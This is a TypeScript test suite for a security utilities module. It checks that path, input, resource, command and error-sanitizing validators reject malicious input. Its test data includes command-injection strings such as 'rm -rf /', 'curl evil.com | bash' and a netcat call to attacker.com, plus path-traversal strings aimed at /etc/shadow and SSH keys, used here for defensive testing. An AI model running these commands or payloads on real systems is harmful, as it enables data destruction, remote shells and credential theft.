/**
 * Security Utils Test Suite
 * Demonstrates security validation and attack prevention
 */
import { describe, test, expect } from "bun:test";
import {
  PathValidator,
  InputValidator,
  ResourceValidator,
  CommandValidator,
  ErrorSanitizer,
  SecurityError,
  SECURITY_LIMITS,
} from "@/utils/SecurityUtils";

describe("PathValidator", () => {
  describe("validateTaskId", () => {
    test("accepts valid task IDs", () => {
      const validIds = [
        "task-001-test",
        "task-123-my-feature",
        "task-999999-long-name-with-dashes",
      ];

      validIds.forEach((id) => {
        expect(() => PathValidator.validateTaskId(id)).not.toThrow();
      });
    });

    test("rejects invalid task IDs", () => {
      const invalidIds = [
        "task-001-test; rm -rf /", // Command injection attempt
        "task-001-test`whoami`", // Command substitution
        "task-001-test$(cat /etc/passwd)", // Command substitution
        "../../etc/passwd", // Path traversal
        "task-001-TEST", // Uppercase not allowed
        "task-abc-test", // Non-numeric after task-
        "invalid", // Doesn't match pattern
        "task-001-test/../../", // Path separator
        "task-001-test\0", // Null byte
      ];

      invalidIds.forEach((id) => {
        expect(() => PathValidator.validateTaskId(id)).toThrow(SecurityError);
      });
    });
  });

  describe("sanitize", () => {
    test("allows paths within base directory", () => {
      const baseDir = "/home/user/app";
      const validPaths = [
        "/home/user/app/data/file.txt",
        "/home/user/app/tasks/task-001-test/config.json",
      ];

      validPaths.forEach((path) => {
        expect(() => PathValidator.sanitize(path, baseDir)).not.toThrow();
      });
    });

    test("prevents path traversal attacks", () => {
      const baseDir = "/home/user/app";
      const maliciousPaths = [
        "/etc/passwd",
        "../../etc/passwd",
        "/home/user/app/../../../etc/passwd",
        "/home/user/app/tasks/../../../../../../etc/shadow",
        "/home/../root/.ssh/id_rsa",
      ];

      maliciousPaths.forEach((path) => {
        expect(() => PathValidator.sanitize(path, baseDir)).toThrow(
          SecurityError,
        );
      });
    });

    test("rejects paths with null bytes", () => {
      const baseDir = "/home/user/app";
      expect(() =>
        PathValidator.sanitize("/home/user/app/file\0.txt", baseDir),
      ).toThrow(SecurityError);
    });
  });

  describe("buildPath", () => {
    test("constructs safe paths", () => {
      const baseDir = "/home/user/app";
      const path = PathValidator.buildPath(baseDir, "tasks", "open", "task-001-test");

      expect(path).toContain("/home/user/app");
      expect(path).toContain("tasks");
      expect(path).toContain("open");
      expect(path).toContain("task-001-test");
    });

    test("prevents directory traversal in segments", () => {
      const baseDir = "/home/user/app";

      expect(() =>
        PathValidator.buildPath(baseDir, "tasks", "..", "..", "etc", "passwd"),
      ).toThrow(SecurityError);
    });
  });
});

describe("InputValidator", () => {
  describe("validateStringSize", () => {
    test("accepts strings within limit", () => {
      const validString = "a".repeat(1000);
      expect(() => InputValidator.validateStringSize(validString, 10000)).not.toThrow();
    });

    test("rejects oversized strings", () => {
      const oversized = "a".repeat(SECURITY_LIMITS.MAX_STRING_LENGTH + 1);
      expect(() => InputValidator.validateStringSize(oversized)).toThrow(
        SecurityError,
      );
    });
  });

  describe("sanitizeString", () => {
    test("removes null bytes", () => {
      const input = "test\0string\0with\0nulls";
      const sanitized = InputValidator.sanitizeString(input);

      expect(sanitized).not.toContain("\0");
      expect(sanitized).toBe("teststringwithnulls");
    });

    test("trims whitespace", () => {
      const input = "   test string   ";
      const sanitized = InputValidator.sanitizeString(input);

      expect(sanitized).toBe("test string");
    });

    test("rejects oversized strings", () => {
      const oversized = "a".repeat(SECURITY_LIMITS.MAX_STRING_LENGTH + 1);
      expect(() => InputValidator.sanitizeString(oversized)).toThrow(
        SecurityError,
      );
    });
  });

  describe("validateArraySize", () => {
    test("accepts arrays within limit", () => {
      const validArray = new Array(100).fill("item");
      expect(() => InputValidator.validateArraySize(validArray)).not.toThrow();
    });

    test("rejects oversized arrays", () => {
      const oversized = new Array(SECURITY_LIMITS.MAX_ARRAY_LENGTH + 1).fill("item");
      expect(() => InputValidator.validateArraySize(oversized)).toThrow(
        SecurityError,
      );
    });
  });

  describe("safeJsonParse", () => {
    test("parses valid JSON", async () => {
      const json = JSON.stringify({ key: "value" });
      const result = await InputValidator.safeJsonParse(json);

      expect(result).toEqual({ key: "value" });
    });

    test("rejects invalid JSON", async () => {
      const invalidJson = "{ invalid json }";

      await expect(InputValidator.safeJsonParse(invalidJson)).rejects.toThrow(
        SecurityError,
      );
    });

    test("rejects oversized JSON", async () => {
      const oversized = "a".repeat(SECURITY_LIMITS.MAX_JSON_SIZE + 1);

      await expect(InputValidator.safeJsonParse(oversized)).rejects.toThrow(
        SecurityError,
      );
    });
  });
});

describe("ResourceValidator", () => {
  describe("validateTokenCount", () => {
    test("accepts valid token counts", () => {
      expect(() => ResourceValidator.validateTokenCount(1000)).not.toThrow();
      expect(() => ResourceValidator.validateTokenCount(200000)).not.toThrow();
    });

    test("rejects invalid token counts", () => {
      expect(() => ResourceValidator.validateTokenCount(-1)).toThrow(SecurityError);
      expect(() => ResourceValidator.validateTokenCount(200001)).toThrow(
        SecurityError,
      );
    });
  });

  describe("validateTimeout", () => {
    test("accepts valid timeouts", () => {
      expect(() => ResourceValidator.validateTimeout(1)).not.toThrow();
      expect(() => ResourceValidator.validateTimeout(300)).not.toThrow();
      expect(() => ResourceValidator.validateTimeout(3600)).not.toThrow();
    });

    test("rejects invalid timeouts", () => {
      expect(() => ResourceValidator.validateTimeout(0)).toThrow(SecurityError);
      expect(() => ResourceValidator.validateTimeout(3601)).toThrow(SecurityError);
      expect(() => ResourceValidator.validateTimeout(-1)).toThrow(SecurityError);
    });
  });

  describe("validateContentSize", () => {
    test("accepts content within limit", () => {
      const content = "a".repeat(1000);
      expect(() => ResourceValidator.validateContentSize(content)).not.toThrow();
    });

    test("rejects oversized content", () => {
      const oversized = "a".repeat(SECURITY_LIMITS.MAX_FILE_SIZE + 1);
      expect(() => ResourceValidator.validateContentSize(oversized)).toThrow(
        SecurityError,
      );
    });
  });
});

describe("CommandValidator", () => {
  describe("sanitizeArguments", () => {
    test("removes null bytes from arguments", () => {
      const args = ["test\0arg", "normal", "another\0one"];
      const sanitized = CommandValidator.sanitizeArguments(args);

      expect(sanitized).toEqual(["testarg", "normal", "anotherone"]);
    });

    test("rejects oversized arguments", () => {
      const oversized = "a".repeat(SECURITY_LIMITS.MAX_STRING_LENGTH + 1);
      expect(() => CommandValidator.sanitizeArguments([oversized])).toThrow(
        SecurityError,
      );
    });
  });
});

describe("ErrorSanitizer", () => {
  describe("sanitize", () => {
    test("removes file paths from error messages", () => {
      const error = new Error(
        "ENOENT: no such file or directory, open '/home/user/secret/config.json'",
      );
      const sanitized = ErrorSanitizer.sanitize(error, false);

      expect(sanitized).not.toContain("/home/user/secret/config.json");
      expect(sanitized).not.toContain("/home");
      expect(sanitized).not.toContain("/secret");
    });

    test("handles SecurityError specially", () => {
      const error = new SecurityError("Path traversal detected", "PATH_TRAVERSAL");
      const sanitized = ErrorSanitizer.sanitize(error, false);

      expect(sanitized).toBe("Path traversal detected");
    });

    test("provides generic message for non-Error objects", () => {
      const sanitized = ErrorSanitizer.sanitize("random string", false);

      expect(sanitized).toBe("An unknown error occurred");
    });
  });

  describe("createSafeError", () => {
    test("returns SecurityError details", () => {
      const error = new SecurityError(
        "Invalid input detected",
        "INVALID_INPUT",
      );
      const safe = ErrorSanitizer.createSafeError(error, false);

      expect(safe.message).toBe("Invalid input detected");
      expect(safe.code).toBe("INVALID_INPUT");
    });

    test("sanitizes regular errors", () => {
      const error = new Error("Internal error at /home/user/app/secret.ts:123");
      const safe = ErrorSanitizer.createSafeError(error, false);

      expect(safe.message).not.toContain("/home/user/app");
      expect(safe.code).toBe("INTERNAL_ERROR");
    });
  });
});

describe("Attack Prevention Scenarios", () => {
  test("prevents command injection via task ID", () => {
    const attackIds = [
      "task-001-test; rm -rf /",
      "task-001-test && curl evil.com | bash",
      "task-001-test`whoami`",
      "task-001-test$(cat /etc/passwd)",
      "task-001-test|nc attacker.com 1234",
    ];

    attackIds.forEach((attackId) => {
      expect(() => PathValidator.validateTaskId(attackId)).toThrow(SecurityError);
    });
  });

  test("prevents path traversal attacks", () => {
    const baseDir = "/home/user/app";
    const attackPaths = [
      "../../etc/passwd",
      "../../../root/.ssh/id_rsa",
      "/etc/shadow",
      "../../../../../../etc/hosts",
      "/home/user/app/../../../etc/passwd",
    ];

    attackPaths.forEach((attackPath) => {
      expect(() => PathValidator.sanitize(attackPath, baseDir)).toThrow(
        SecurityError,
      );
    });
  });

  test("prevents resource exhaustion via large inputs", () => {
    // Large string attack
    const hugeString = "a".repeat(SECURITY_LIMITS.MAX_STRING_LENGTH + 1);
    expect(() => InputValidator.validateStringSize(hugeString)).toThrow(
      SecurityError,
    );

    // Large array attack
    const hugeArray = new Array(SECURITY_LIMITS.MAX_ARRAY_LENGTH + 1).fill("x");
    expect(() => InputValidator.validateArraySize(hugeArray)).toThrow(
      SecurityError,
    );

    // Large content attack
    const hugeContent = "x".repeat(SECURITY_LIMITS.MAX_FILE_SIZE + 1);
    expect(() => ResourceValidator.validateContentSize(hugeContent)).toThrow(
      SecurityError,
    );
  });

  test("prevents null byte injection", () => {
    const nullByteAttacks = [
      "file.txt\0.jpg", // Bypass file extension check
      "task-001-test\0", // Bypass validation
      "../../etc/passwd\0garbage", // Path traversal with null byte
    ];

    nullByteAttacks.forEach((attack) => {
      const sanitized = InputValidator.sanitizeString(attack);
      expect(sanitized).not.toContain("\0");
    });
  });
});

describe("Security Limits", () => {
  test("SECURITY_LIMITS are defined", () => {
    expect(SECURITY_LIMITS.MAX_PATH_LENGTH).toBe(4096);
    expect(SECURITY_LIMITS.MAX_FILE_SIZE).toBe(100 * 1024 * 1024);
    expect(SECURITY_LIMITS.MAX_JSON_SIZE).toBe(10 * 1024 * 1024);
    expect(SECURITY_LIMITS.MAX_REQUEST_SIZE).toBe(10 * 1024 * 1024);
    expect(SECURITY_LIMITS.MAX_STRING_LENGTH).toBe(1 * 1024 * 1024);
    expect(SECURITY_LIMITS.MAX_ARRAY_LENGTH).toBe(10000);
    expect(SECURITY_LIMITS.MAX_OUTPUT_SIZE).toBe(50 * 1024 * 1024);
  });
});
